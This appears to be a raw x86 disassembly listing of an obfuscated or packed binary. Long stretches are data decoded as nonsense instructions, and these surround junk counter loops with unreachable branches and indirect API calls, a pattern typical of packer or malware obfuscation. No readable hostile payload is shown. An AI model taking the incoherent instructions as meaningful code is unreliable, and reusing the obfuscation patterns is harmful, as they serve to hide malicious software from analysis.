  407179:	gs out 0x88,eax
  40717c:	sub    BYTE PTR [ecx],0x6
  40717f:	jmp    0x350c1117
  407184:	mov    al,ds:0x48ac5374
  407189:	push   ebx
  40718a:	cdq    
  40718b:	aas    
  40718c:	mov    eax,ds:0x7d2efc02
  407191:	aad    0x1f
  407193:	xor    eax,0xbc2eda00
  407198:	aam    0xff
  40719a:	data16 std 
  40719c:	cwde   
  40719d:	(bad)  
  40719e:	mov    ebx,0x29f58a28
  4071a3:	push   ss
  4071a4:	or     DWORD PTR [ebx+0x47],edx
  4071a7:	fwait
  4071a8:	jno    0x40712b
  4071aa:	cwde   
  4071ab:	push   ebp
  4071ac:	icebp  
  4071ad:	xor    BYTE PTR [ebp-0x6a],cl
  4071b0:	pop    ecx
  4071b1:	inc    esp
  4071b2:	ret    
  4071b3:	cmove  ecx,DWORD PTR [ecx+0x36]
  4071b7:	add    eax,DWORD PTR ss:[edx-0x7a]
  4071bb:	push   edx
  4071bc:	push   ds
  4071bd:	mov    ebx,0xd4207209
  4071c2:	outs   dx,BYTE PTR ds:[esi]
  4071c3:	bound  eax,QWORD PTR [eax+0x20]
  4071c6:	or     BYTE PTR [ebx-0x343259aa],0x92
  4071cd:	outs   dx,BYTE PTR ds:[esi]
  4071ce:	loop   0x4071b2
  4071d0:	sbb    DWORD PTR [edi],ecx
  4071d2:	jmp    0xd0f2cd71
  4071d7:	dec    esp
  4071d8:	mov    ds:0xaf6e3665,eax
  4071dd:	jb     0x40722c
  4071df:	pushf  
  4071e0:	pop    ds
  4071e1:	and    bl,BYTE PTR [ebx]
  4071e3:	clc    
  4071e4:	fcomp  DWORD PTR [esi+0x32]
  4071e7:	std    
  4071e8:	mov    al,ds:0xbb8b1a65
  4071ed:	int    0x42
  4071ef:	dec    eax
  4071f0:	gs push ebx
  4071f2:	pop    edi
  4071f3:	lods   al,BYTE PTR ds:[esi]
  4071f4:	ror    ecx,cl
  4071f6:	xchg   bl,dh
  4071f8:	aas    
  4071f9:	fimul  WORD PTR [eax+ecx*4-0xb]
  4071fd:	dec    ebp
  4071fe:	clc    
  4071ff:	mov    dh,0xd4
  407201:	fwait
  407202:	jp     0x40718a
  407204:	adc    al,0x7
  407206:	inc    ebp
  407207:	inc    ebx
  407208:	int3   
  407209:	gs in  eax,0xc2
  40720c:	jl     0x40719c
  40720e:	ficom  WORD PTR [ecx+0x4d]
  407211:	inc    esp
  407212:	lods   eax,DWORD PTR ds:[esi]
  407213:	jmp    0x341d:0xe8eeb411
  40721a:	add    al,0x0
  40721c:	add    BYTE PTR [ebx],bl
  40721e:	mov    ecx,0x722712fa
  407223:	sub    eax,0x7b212928
  407228:	pop    esi
  407229:	rcl    dh,cl
  40722b:	push   ebx
  40722c:	in     eax,0x10
  40722e:	add    eax,0xf853083d
  407233:	sbb    al,0x69
  407235:	xor    al,0x73
  407237:	in     al,0x4
  407239:	fs cs clc 
  40723c:	sub    al,0x2
  40723e:	and    BYTE PTR [ecx],cl
  407240:	mov    cl,0x48
  407242:	aad    0xd1
  407244:	pushf  
  407245:	frstor [ebx+ebx*2]
  407248:	sub    bl,BYTE PTR [ebx-0x4b]
  40724b:	jge    0x407249
  40724d:	out    0x6e,al
  40724f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407250:	dec    ebp
  407251:	aas    
  407252:	mov    al,ds:0x63544341
  407257:	call   0xebb05bf0
  40725c:	daa    
  40725d:	cld    
  40725e:	jp     0x40720e
  407260:	into   
  407261:	imul   esi,DWORD PTR ds:0x1f1a7afa,0x150caad3
  40726b:	cs pop ebx
  40726d:	dec    eax
  40726f:	sbb    esi,DWORD PTR [edx]
  407271:	les    ebp,FWORD PTR [ecx]
  407273:	and    al,0x1e
  407275:	adc    al,0x97
  407277:	rcl    BYTE PTR [eax+0x676e37f1],cl
  40727d:	adc    al,0x85
  40727f:	cli    
  407280:	add    ch,BYTE PTR [edx]
  407282:	jge    0x407275
  407284:	ja     0x4072fd
  407286:	or     al,0x8
  407288:	mov    ebx,0x950401a7
  40728d:	data16 mov ch,0xe2
  407290:	int    0x92
  407292:	out    dx,al
  407293:	sbb    ax,0xe6fe
  407297:	movq   QWORD PTR [edi-0x58fbc30f],mm7
  40729e:	xor    DWORD PTR [esi-0xf],0xe4588759
  4072a5:	cs cwde 
  4072a7:	sub    eax,0x6cf43396
  4072ac:	jns    0x407292
  4072ae:	in     al,0x26
  4072b0:	inc    eax
  4072b1:	aad    0xc2
  4072b3:	imul   ecx,DWORD PTR [ecx],0xed9196a8
  4072b9:	cli    
  4072ba:	dec    edi
  4072bb:	pop    edi
  4072bc:	fs mov dh,0x2f
  4072bf:	loopne 0x4072b6
  4072c1:	(bad)  
  4072c2:	mov    edi,0x2b34bc0f
  4072c7:	dec    edi
  4072c8:	xlat   BYTE PTR ds:[ebx]
  4072c9:	je     0x407285
  4072cb:	js     0x40732d
  4072cd:	les    ebx,FWORD PTR [eax-0x48]
  4072d0:	and    esp,DWORD PTR [ebx+0x2a]
  4072d3:	out    0x9f,al
  4072d5:	push   0x2b
  4072d7:	or     ah,BYTE PTR [esi-0x2e]
  4072da:	gs gs or eax,edx
  4072de:	jmp    FWORD PTR [edi]
  4072e0:	inc    ebx
  4072e1:	and    BYTE PTR [ecx],al
  4072e3:	lahf   
  4072e4:	xchg   edx,eax
  4072e5:	mov    ds:0xd270f2b2,eax
  4072ea:	out    dx,eax
  4072eb:	or     al,0x44
  4072ed:	pusha  
  4072ee:	and    BYTE PTR [ebp+edi*2-0x1d],dl
  4072f2:	imul   edi,DWORD PTR [edx-0xe96b45a],0xcee5f86f
  4072fc:	imul   edx,ebp,0xffffffc6
  4072ff:	inc    edx
  407300:	sbb    al,0x56
  407302:	fisttp WORD PTR [edx-0x6e]
  407305:	sub    BYTE PTR [edi+0x1940b414],dl
  40730b:	mov    ch,0x54
  40730d:	repnz mov edx,0x86d31eab
  407313:	or     al,0xf2
  407315:	int3   
  407316:	dec    DWORD PTR [edi]
  407318:	xor    BYTE PTR ds:0xb8488cca,ch
  40731e:	daa    
  40731f:	aaa    
  407320:	mov    eax,0x3ae03d62
  407325:	lock xor eax,DWORD PTR [ebx]
  407328:	inc    BYTE PTR [esi+edi*4]
  40732b:	out    dx,al
  40732c:	mov    ebx,DWORD PTR [ebx-0x13ba691]
  407332:	outs   dx,BYTE PTR ds:[esi]
  407333:	stos   DWORD PTR es:[edi],eax
  407334:	jne    0x4073a8
  407336:	loope  0x4072de
  407338:	inc    eax
  407339:	push   0x989b8248
  40733e:	mov    bh,0xc8
  407340:	mov    esi,0x9b8c3f87
  407345:	aas    
  407346:	inc    esp
  407347:	fldcw  WORD PTR [eax+0x5aafeee8]
  40734d:	sub    dl,BYTE PTR ds:0x18ec7d5d
  407353:	and    dh,bl
  407355:	aam    0x14
  407357:	add    ebx,DWORD PTR [ebp-0x59bf7da1]
  40735d:	dec    eax
  40735e:	fbld   TBYTE PTR [edx+0x39]
  407361:	cs jns 0x407381
  407364:	and    eax,0x507dec3b
  407369:	pop    ebx
  40736a:	sub    eax,0x1e57b807
  40736f:	pop    edx
  407370:	sahf   
  407371:	iret   
  407372:	cmp    bl,BYTE PTR ds:0xd0a217fd
  407378:	mov    ebx,0x76491255
  40737d:	xchg   edx,eax
  40737e:	inc    eax
  40737f:	and    ebx,esi
  407381:	js     0x407329
  407383:	neg    DWORD PTR [ebp+0x66b30533]
  407389:	ds jp  0x4073bc
  40738c:	adc    DWORD PTR [esp+esi*2-0x38],edx
  407390:	add    al,al
  407392:	mov    WORD PTR [edx+0x1c],ss
  407395:	in     al,0xd0
  407397:	pop    edx
  407398:	jmp    0x4ce6:0xc13f3e60
  40739f:	clc    
  4073a0:	dec    esi
  4073a1:	je     0x4073e2
  4073a3:	popa   
  4073a4:	shl    DWORD PTR [ebp-0x62d6999f],0x6d
  4073ab:	in     eax,0xe7
  4073ad:	jecxz  0x4073c1
  4073af:	adc    DWORD PTR [edx],esp
  4073b1:	sbb    eax,0x46407508
  4073b6:	or     cl,BYTE PTR [eax+ebx*2]
  4073b9:	dec    esi
  4073ba:	mov    bl,0x54
  4073bc:	std    
  4073bd:	cmp    BYTE PTR [ebx],0x90
  4073c0:	inc    ebp
  4073c1:	test   eax,0x9519119a
  4073c6:	add    BYTE PTR [ebp+0x26],al
  4073c9:	jmp    0x407419
  4073cb:	retf   
  4073cc:	(bad)  
  4073cd:	retf   
  4073ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073cf:	xchg   esp,eax
  4073d0:	rcr    BYTE PTR [ebp+0x44],0x41
  4073d4:	jo     0x4073e4
  4073d6:	cmp    eax,0x7a434ef9
  4073db:	test   DWORD PTR [eax+0x42e569b7],esi
  4073e1:	cmp    DWORD PTR [esi+0x369bac10],ebp
  4073e7:	lods   al,BYTE PTR ds:[esi]
  4073e8:	and    al,0xd4
  4073ea:	cld    
  4073eb:	ret    
  4073ec:	jns    0x40739d
  4073ee:	mov    ah,0xdf
  4073f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f1:	gs and eax,0xe5e0128c
  4073f7:	xor    DWORD PTR [ebp-0x68],edi
  4073fa:	xlat   BYTE PTR ds:[ebx]
  4073fb:	jle    0x40738e
  4073fd:	or     DWORD PTR [edi-0xa036dfc],edx
  407403:	xor    BYTE PTR [edx+0x4d16c5a5],bl
  407409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40740a:	addr16 cmp eax,0xb3daf136
  407410:	and    ebx,DWORD PTR [esi-0x4d]
  407413:	pop    es
  407414:	mov    ch,0xe4
  407416:	daa    
  407417:	pusha  
  407418:	and    al,0xd2
  40741a:	fcmovbe st,st(3)
  40741c:	xchg   esp,eax
  40741d:	(bad)  
  40741e:	xchg   ecx,eax
  40741f:	xor    ebx,esi
  407421:	dec    ebx
  407422:	push   cs
  407423:	pop    ebp
  407424:	lds    ecx,FWORD PTR [ecx]
  407426:	push   es
  407427:	dec    esp
  407428:	sub    esi,DWORD PTR [eax]
  40742a:	xchg   BYTE PTR [ebx],bl
  40742c:	xchg   DWORD PTR [ebx],esi
  40742e:	mov    edi,0xd099877
  407433:	(bad)  
  407435:	add    DWORD PTR [edx-0x6c],0xfffffffe
  407439:	in     eax,dx
  40743a:	jno    0x4073f2
  40743c:	jo     0x407429
  40743e:	lock jb 0x40745d
  407441:	add    al,BYTE PTR [ebp+0x37]
  407444:	mov    ecx,0x5d31e266
  407449:	sahf   
  40744a:	loop   0x4073eb
  40744c:	push   ebp
  40744d:	hlt    
  40744e:	sub    bl,BYTE PTR [eax]
  407450:	imul   edx,edi,0x794e3732
  407456:	rcr    DWORD PTR [esi],0xb3
  407459:	xchg   cl,al
  40745b:	js     0x407469
  40745d:	push   ss
  40745e:	mov    ch,BYTE PTR [ebx+0x5376b216]
  407464:	out    dx,eax
  407465:	sti    
  407466:	fucomp st(7)
  407468:	xor    bl,BYTE PTR [esi+0x3fa0f92]
  40746e:	loopne 0x40747c
  407470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407471:	mov    al,0x77
  407473:	jmp    0x407454
  407475:	mov    BYTE PTR [ecx],bh
  407477:	std    
  407478:	das    
  407479:	icebp  
  40747a:	jmp    0x966f:0x44ba1f52
  407481:	gs push ebx
  407483:	mov    DWORD PTR ds:0x433697,0x17
  40748d:	cmp    DWORD PTR ds:0x433697,0x0
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433697,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433697,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433697
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433697,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433697
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433697,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4336ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4336ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	imul   esi,DWORD PTR [edi],0xc856bc57
  407507:	jl     0x407585
  407509:	xlat   BYTE PTR ds:[ebx]
  40750a:	jns    0x407588
  40750c:	jl     0x407526
  40750e:	pop    ss
  40750f:	pop    es
  407510:	retf   0x5a73
  407513:	fs jae 0x4074fc
  407516:	cs sti 
  407518:	mov    cs,WORD PTR [ebx+0x5a]
  40751b:	das    
  40751c:	push   ss
  40751d:	adc    eax,0x3e4db95
  407522:	xor    al,0xeb
  407524:	ret    
  407525:	jmp    0x36c4:0xf6c22535
  40752c:	jge    0x407505
  40752e:	cmp    eax,0x1c25501c
  407533:	sbb    DWORD PTR [ecx+0x47],ebp
  407536:	mov    ebp,0x90a332c0
  40753b:	pusha  
  40753c:	and    BYTE PTR [ebx-0x2632586c],cl
  407542:	add    edi,DWORD PTR [edi+0x5]
  407545:	push   edi
  407546:	pushf  
  407547:	sub    ecx,ebp
  407549:	adc    esi,DWORD PTR [edi+0x11807ce4]
  40754f:	push   es
  407550:	xor    ch,BYTE PTR [edx-0x4d0977c6]
  407556:	add    DWORD PTR [ebx],0xffffffa8
  407559:	ins    DWORD PTR es:[edi],dx
  40755a:	push   ebx
  40755b:	sub    eax,0x4b335e1f
  407560:	jmp    0xca8de4a6
  407565:	cmp    BYTE PTR [esi],bh
  407567:	pop    ecx
  407568:	mov    edx,0x1d69a908
  40756d:	xchg   BYTE PTR [esi],bh
  40756f:	adc    BYTE PTR [ecx*2+0x18352c22],cl
  407576:	push   es
  407577:	sbb    eax,DWORD PTR [ebx+0x1297c7c]
  40757d:	pop    ss
  40757e:	shl    DWORD PTR [esi],0x7a
  407581:	inc    esp
  407582:	ficom  DWORD PTR [edi-0x6]
  407585:	push   ecx
  407586:	mov    dh,0xcb
  407588:	shl    DWORD PTR [esi-0x51],0x99
  40758c:	shl    DWORD PTR [ebx],1
  40758e:	pop    eax
  40758f:	inc    esi
  407590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407591:	call   0xd3b:0xe9fc197c
  407598:	cmp    esp,DWORD PTR [ebx-0x4e]
  40759b:	out    0x74,al
  40759d:	cmp    BYTE PTR [ecx+eiz*8+0x2688376a],dh
  4075a4:	add    eax,0xb065ec0a
  4075a9:	cwde   
  4075aa:	stos   BYTE PTR es:[edi],al
  4075ab:	mov    ebx,0xc7093db5
  4075b0:	pop    edi
  4075b1:	inc    DWORD PTR [ebx]
  4075b3:	sub    al,0x85
  4075b5:	cmc    
  4075b6:	leave  
  4075b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075b8:	lods   eax,DWORD PTR ds:[esi]
  4075b9:	rol    ebp,1
  4075bb:	dec    esp
  4075bc:	fist   DWORD PTR [edi]
  4075be:	jmp    0x4075f0
  4075c0:	jne    0x407613
  4075c2:	xor    BYTE PTR [esi-0x4e5553c4],dl
  4075c8:	ret    
  4075c9:	sub    BYTE PTR [edx-0x73],0x1f
  4075cd:	pop    ebp
  4075ce:	sbb    dl,cl
  4075d0:	stos   BYTE PTR es:[edi],al
  4075d1:	dec    esp
  4075d2:	add    al,0x83
  4075d4:	xchg   ebx,eax
  4075d5:	pop    eax
  4075d6:	cmp    al,0xbb
  4075d8:	or     DWORD PTR [esi],esp
  4075da:	ins    BYTE PTR es:[edi],dx
  4075db:	inc    esi
  4075dc:	dec    ecx
  4075dd:	test   al,0xf5
  4075df:	and    cl,bh
  4075e1:	jae    0x4075c7
  4075e3:	mov    al,ds:0x323d5e36
  4075e8:	lods   al,BYTE PTR ds:[esi]
  4075e9:	cdq    
  4075ea:	pop    es
  4075eb:	dec    eax
  4075ec:	add    esi,DWORD PTR [esi+esi*1-0x3bdec1d2]
  4075f3:	mov    bl,0x9c
  4075f5:	sub    BYTE PTR [edx],cl
  4075f7:	stos   DWORD PTR es:[edi],eax
  4075f8:	mov    esi,DWORD PTR [ebp-0x6c]
  4075fb:	xchg   esp,eax
  4075fc:	int    0x66
  4075fe:	repnz leave 
  407600:	pop    edi
  407601:	mov    al,0xe6
  407603:	jb     0x407676
  407605:	push   ecx
  407606:	add    al,0x2b
  407608:	adc    bh,cl
  40760a:	dec    esi
  40760b:	pop    esi
  40760c:	into   
  40760d:	mov    ebp,0x6c450a38
  407612:	inc    ebp
  407613:	fisubr DWORD PTR [ecx]
  407615:	data16 sti 
  407617:	push   esi
  407618:	sbb    BYTE PTR ds:0xf78e2faf,ah
  40761e:	sti    
  40761f:	out    0x9f,eax
  407621:	xchg   edx,edx
  407623:	(bad)  
  407624:	jecxz  0x4075f5
  407626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407627:	pop    esi
  407628:	add    ecx,DWORD PTR [ecx-0x66]
  40762b:	(bad)  
  40762c:	shr    bh,cl
  40762e:	mov    eax,ds:0x20f62b8f
  407633:	stos   DWORD PTR es:[edi],eax
  407634:	or     BYTE PTR [esi-0x73d8ad18],bh
  40763a:	xchg   DWORD PTR [edi+ebp*4],ebp
  40763d:	add    al,0xfc
  40763f:	fidiv  DWORD PTR [esi-0x2d]
  407642:	inc    esp
  407643:	(bad)  
  407644:	jmp    0xff5bbf5e
  407649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40764a:	push   ebp
  40764b:	push   cs
  40764c:	xor    DWORD PTR [ebp+0x90dbc21],esi
  407652:	cmp    al,bh
  407654:	fs jge 0x407657
  407657:	fwait
  407658:	lods   al,BYTE PTR ds:[esi]
  407659:	inc    edi
  40765a:	imul   edi,DWORD PTR [edx+0x7d],0xffffffc2
  40765e:	inc    ebp
  40765f:	fcomp  st(1)
  407661:	mov    ds:0xa00102ec,eax
  407666:	xchg   BYTE PTR [ebx],bl
  407668:	jae    0x4076e9
  40766a:	das    
  40766b:	cmp    al,0x1d
  40766d:	xchg   DWORD PTR [ebx-0x5],eax
  407670:	into   
  407671:	dec    esi
  407672:	xchg   edx,eax
  407673:	inc    ebx
  407674:	lods   eax,DWORD PTR ds:[esi]
  407675:	xor    esp,ecx
  407677:	in     eax,0x71
  407679:	std    
  40767a:	and    BYTE PTR ds:0xf104f6cd,0x17
  407681:	loopne 0x4076a6
  407683:	mov    eax,ds:0x3bc8381e
  407688:	jp     0x4076f0
  40768a:	iret   
  40768b:	test   eax,0x4324824
  407690:	out    dx,eax
  407691:	fwait
  407692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407693:	mov    bl,ch
  407695:	pop    esi
  407696:	std    
  407697:	ds inc esi
  407699:	clc    
  40769a:	fwait
  40769b:	ret    0x5270
  40769e:	xchg   esi,ecx
  4076a0:	adc    BYTE PTR [eax+esi*2],cl
  4076a3:	sbb    BYTE PTR [ecx+0x58],dh
  4076a6:	or     al,0x73
  4076a8:	pop    esp
  4076a9:	lds    edi,FWORD PTR [edi]
  4076ab:	push   ecx
  4076ac:	jo     0x4076fa
  4076ae:	push   ecx
  4076af:	clc    
  4076b0:	sub    eax,0x13c7f8a9
  4076b6:	inc    ebx
  4076b7:	dec    ebp
  4076b8:	sahf   
  4076b9:	jo     0x407735
  4076bb:	shl    DWORD PTR [esi-0x67],1
  4076be:	fcomp  QWORD PTR [ecx+eiz*4-0x4d]
  4076c2:	cwde   
  4076c3:	outs   dx,BYTE PTR ds:[esi]
  4076c4:	jmp    0x1b2b:0x34cce234
  4076cb:	pop    es
  4076cc:	gs dec edi
  4076ce:	nop
  4076cf:	and    eax,0x1aa51cda
  4076d4:	xchg   edx,eax
  4076d5:	mov    bh,0xcc
  4076d7:	aaa    
  4076d8:	pop    esp
  4076d9:	int    0xf1
  4076db:	sub    eax,0x4a77799
  4076e0:	cmp    DWORD PTR [ebp-0x6debf333],eax
  4076e6:	je     0x4076aa
  4076e8:	jnp    0x4076be
  4076ea:	add    al,0xc5
  4076ec:	cld    
  4076ed:	or     DWORD PTR [eax],ebx
  4076ef:	test   BYTE PTR [edx+0x1a],ch
  4076f2:	push   cs
  4076f3:	dec    ebx
  4076f4:	push   edx
  4076f5:	jmp    FWORD PTR [esi-0xb9cdb45]
  4076fb:	pop    es
  4076fc:	push   es
  4076fd:	stos   DWORD PTR es:[edi],eax
  4076fe:	gs scas eax,DWORD PTR es:[edi]
  407700:	cdq    
  407701:	xor    eax,edi
  407703:	popa   
  407704:	push   ds
  407705:	mov    bh,0xfb
  407707:	(bad)  
  407708:	mov    edi,0x68abf29b
  40770d:	mov    ch,0x4a
  40770f:	sbb    ch,BYTE PTR [edi]
  407711:	ds ss cmp eax,edi
  407715:	sbb    BYTE PTR [edi],cl
  407717:	fbld   TBYTE PTR [edx+0x31def2e1]
  40771d:	or     al,BYTE PTR [eax-0x46]
  407720:	nop
  407721:	mov    ch,0x7a
  407723:	lods   al,BYTE PTR ds:[esi]
  407724:	adc    esi,DWORD PTR [ebp-0x7abadacd]
  40772a:	add    DWORD PTR [ecx],eax
  40772c:	sub    BYTE PTR [ecx],bl
  40772e:	loop   0x4076de
  407730:	sub    cl,BYTE PTR [edi-0xdc1656b]
  407736:	sub    DWORD PTR [ecx-0x399b755d],esi
  40773c:	in     eax,0x4a
  40773e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40773f:	inc    esi
  407740:	or     al,0x63
  407742:	ins    BYTE PTR es:[edi],dx
  407743:	call   0x8509871
  407748:	push   ss
  407749:	pop    ecx
  40774a:	outs   dx,DWORD PTR ds:[esi]
  40774b:	sbb    DWORD PTR [ebx+0x62],edi
  40774e:	pop    esi
  40774f:	outs   dx,DWORD PTR ds:[esi]
  407750:	inc    esp
  407751:	mov    eax,DWORD PTR [edi-0x20]
  407754:	int3   
  407755:	pop    ebx
  407756:	imul   eax,DWORD PTR [esi+edi*2],0x17
  40775a:	mov    ds:0x48000a2d,eax
  40775f:	dec    edi
  407760:	sbb    al,0xc5
  407762:	pop    edx
  407763:	sbb    esp,DWORD PTR [ebx+esi*4]
  407766:	fsubr  QWORD PTR [ecx+0x61]
  407769:	aam    0x81
  40776b:	mov    BYTE PTR [esi-0x26],dl
  40776e:	lods   eax,DWORD PTR ds:[esi]
  40776f:	ins    DWORD PTR es:[edi],dx
  407770:	data16 jbe 0x4077d9
  407773:	dec    eax
  407774:	inc    ecx
  407775:	or     eax,0x44d8421b
  40777a:	fcmovbe st,st(3)
  40777c:	xor    al,0x24
  40777e:	xchg   BYTE PTR [esi-0x1261b79d],cl
  407784:	push   ebx
  407785:	aad    0x93
  407787:	in     eax,dx
  407788:	das    
  407789:	cdq    
  40778a:	in     al,dx
  40778b:	adc    DWORD PTR [esp+ecx*8],0x98c1797d
  407792:	jns    0x4077ed
  407794:	imul   edi,ebp,0xffffff82
  407797:	push   0x7f8966e2
  40779c:	fcmovne st,st(6)
  40779e:	jl     0x40778e
  4077a0:	icebp  
  4077a1:	xor    ah,BYTE PTR [ebp-0x3]
  4077a4:	push   es
  4077a5:	and    BYTE PTR [eax+0x39665d00],ch
  4077ab:	cmp    ch,BYTE PTR [ebp+0x4cb8d2ea]
  4077b1:	mov    ch,0x3
  4077b3:	pusha  
  4077b4:	loope  0x407775
  4077b6:	add    eax,0xac8c3084
  4077bb:	jnp    0x407816
  4077bd:	scas   eax,DWORD PTR es:[edi]
  4077be:	or     edx,DWORD PTR [edx-0x17]
  4077c1:	daa    
  4077c2:	mov    esp,0xa8113d18
  4077c7:	pushf  
  4077c8:	stos   BYTE PTR es:[edi],al
  4077c9:	lods   eax,DWORD PTR ds:[esi]
  4077ca:	dec    ebx
  4077cb:	lahf   
  4077cc:	adc    eax,0xba96683f
  4077d1:	dec    ecx
  4077d2:	inc    ebp
  4077d3:	mov    al,ds:0x8350a77b
  4077d8:	xlat   BYTE PTR ds:[ebx]
  4077d9:	(bad)  
  4077da:	cli    
  4077db:	data16 scas al,BYTE PTR es:[edi]
  4077dd:	dec    eax
  4077de:	jo     0x40784e
  4077e0:	pop    es
  4077e1:	fmul   DWORD PTR [ebp+0x4859b4d2]
  4077e7:	cmp    dh,BYTE PTR [edx]
  4077e9:	or     DWORD PTR [edi],esi
  4077eb:	jns    0x40783d
  4077ed:	shl    al,1
  4077ef:	or     DWORD PTR [eax+0x70],ebp
  4077f2:	inc    ebp
  4077f3:	std    
  4077f4:	sub    bh,BYTE PTR [edi]
  4077f6:	mov    ebx,0xe4419755
  4077fb:	jb     0x407822
  4077fd:	sbb    al,0x9
  4077ff:	inc    edx
  407800:	xor    al,0xa4
  407802:	dec    eax
  407803:	or     edi,DWORD PTR [ecx-0x64]
  407806:	aaa    
  407807:	add    eax,0x630f3982
  40780c:	xchg   edx,eax
  40780d:	int3   
  40780e:	outs   dx,DWORD PTR ds:[esi]
  40780f:	aaa    
  407810:	pop    ebp
  407811:	xor    BYTE PTR [esi+0xe],bl
  407814:	popf   
  407815:	sbb    ebx,edx
  407817:	jecxz  0x40788e
  407819:	dec    esp
  40781a:	xchg   ebx,eax
  40781b:	jmp    0x4077ee
  40781d:	test   al,0x3e
  40781f:	loopne 0x4077cb
  407821:	jbe    0x4077cd
  407823:	pmulhuw mm2,QWORD PTR [edx-0x2409fcd7]
  40782a:	pusha  
  40782b:	or     ebx,DWORD PTR [edi]
  40782d:	dec    edi
  40782e:	cmc    
  40782f:	test   BYTE PTR [eax+0x46],0x27
  407833:	lock dec edx
  407835:	test   eax,0x29c3980f
  40783a:	nop
  40783b:	(bad)  
  40783e:	mov    dh,0x95
  407840:	outs   dx,DWORD PTR ds:[esi]
  407841:	push   edi
  407842:	push   es
  407843:	jge    0x407896
  407845:	adc    al,0x31
  407847:	mov    ds:0x3fd61507,al
  40784c:	cmc    
  40784d:	arpl   WORD PTR [ecx],bp
  40784f:	mov    cl,0x2b
  407851:	lahf   
  407852:	mov    ds:0x5af2f3e2,eax
  407857:	pop    edi
  407858:	inc    edx
  407859:	imul   ebp,DWORD PTR [eax-0x14],0x9ad5ddcb
  407860:	jge    0x4078d7
  407862:	push   eax
  407863:	xor    BYTE PTR [ecx-0x3c],cl
  407866:	mov    eax,DWORD PTR [ebp-0x1c]
  407869:	and    DWORD PTR ds:0x433717,0x0
  407873:	mov    ebx,DWORD PTR ds:0x433717
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433717,ebx
  407880:	cmp    DWORD PTR ds:0x433717,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433717,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433717
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433717,ebx
  4078b0:	cmp    DWORD PTR ds:0x433717,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43364b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4336eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4336eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4336eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4336eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4336eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433914
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4336eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4336eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4336eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43364b,0x19
  407943:	cmp    DWORD PTR ds:0x43364b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43364b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43364b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43364b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43364b,edi
  407988:	mov    edi,DWORD PTR ds:0x43364b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43364b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4336ef
  4079a2:	or     edi,DWORD PTR ds:0x433763
  4079a8:	mov    DWORD PTR ds:0x4336ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4336b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4336b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4336b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4336b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4336b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
